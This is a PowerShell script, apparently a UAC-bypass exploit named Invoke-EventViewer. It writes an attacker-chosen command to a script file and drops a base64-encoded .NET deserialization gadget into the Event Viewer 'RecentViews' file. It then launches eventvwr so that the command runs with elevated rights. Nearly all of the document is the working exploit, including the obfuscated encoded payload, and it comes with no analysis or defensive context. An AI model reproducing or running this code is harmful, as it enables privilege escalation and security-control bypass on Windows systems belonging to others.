function Invoke-EventViewer {
    if ($args){
        echo "[+] Running"

        echo "[1] Crafting Payload"
        $command = $args[0]
        
        # Closes Event Viewer and then runs user commmand.
        echo 'Stop-Process -name mmc*' > C:\Windows\Tasks\EventViewerRCE.ps1 
        echo $command >> C:\Windows\Tasks\EventViewerRCE.ps1

        $payload = 'AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAAH8EAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAoQc8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgcG93ZXJzaGVsbC5leGUgLW5vcCAtZSBVd0JsQUhRQUxRQkZBSGdBWlFCakFIVUFkQUJwQUc4QWJnQlFBRzhBYkFCcEFHTUFlUUFnQUVJQWVRQndBR0VBY3dCekFDQUFMUUJUQUdNQWJ3QndBR1VBSUFCREFIVUFjZ0J5QUdVQWJnQjBBRlVBY3dCbEFISUFPd0FnQUVNQU9nQmNBRmNBYVFCdUFHUUFid0IzQUhNQVhBQlVBR0VBY3dCckFITUFYQUJGQUhZQVpRQnVBSFFBVmdCcEFHVUFkd0JsQUhJQVVnQkRBRVVBTGdCd0FITUFNUUE9IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL'
        [IO.File]::WriteAllBytes("C:\Windows\Tasks\p4yl0ad", [Convert]::FromBase64String($payload))

        echo "[2] Writing Payload"
        WriteFile

        echo "[3] Finally, invoking eventvwr"
        eventvwr
    }
    else {
        echo '[-] Usage: Invoke-EventViewer commandhere'
        echo 'Example: Invoke-EventViewer cmd.exe'
    }
}

function WriteFile {
    $Folder = $env:LOCALAPPDATA+'\Microsoft\Event Viewer'
    if (Test-Path -Path $Folder) {
        "[+] EventViewer Folder exists"
        copy C:\Windows\Tasks\p4yl0ad $env:LOCALAPPDATA\Microsoft\EventV~1\RecentViews
    } else {
        "[+] EventViewer Folder doesn't exist. Will create one"
        mkdir $Folder
        copy C:\Windows\Tasks\p4yl0ad $Folder\RecentViews
    }    
}
